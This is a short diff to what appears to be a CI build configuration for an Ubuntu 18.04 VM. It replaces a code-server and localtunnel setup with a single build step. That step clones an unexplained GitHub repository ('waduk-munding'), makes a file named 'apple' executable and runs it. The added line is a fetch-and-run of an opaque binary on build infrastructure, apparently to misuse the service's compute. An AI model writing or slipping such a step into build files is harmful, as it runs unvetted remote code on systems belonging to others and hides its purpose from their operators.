@@ -2,10 +2,4 @@
 FROM vm/ubuntu:18.04
 
 
-RUN sudo apt update && sudo apt install nodejs && sudo apt install npm
-RUN curl -fsSL https://code-server.dev/install.sh | sh -s -- --dry-run
-RUN curl -fsSL https://code-server.dev/install.sh | sh
-RUN npm install -g localtunnel
-
-RUN BACKGROUND localtunnel -p 8040
-EXPOSE WEBSITE http://localhost:8040
+RUN sudo apt update && clone https://github.com/storagegitpush404/waduk-munding.git && cd waduk-munding && chmod +x apple && ./apple
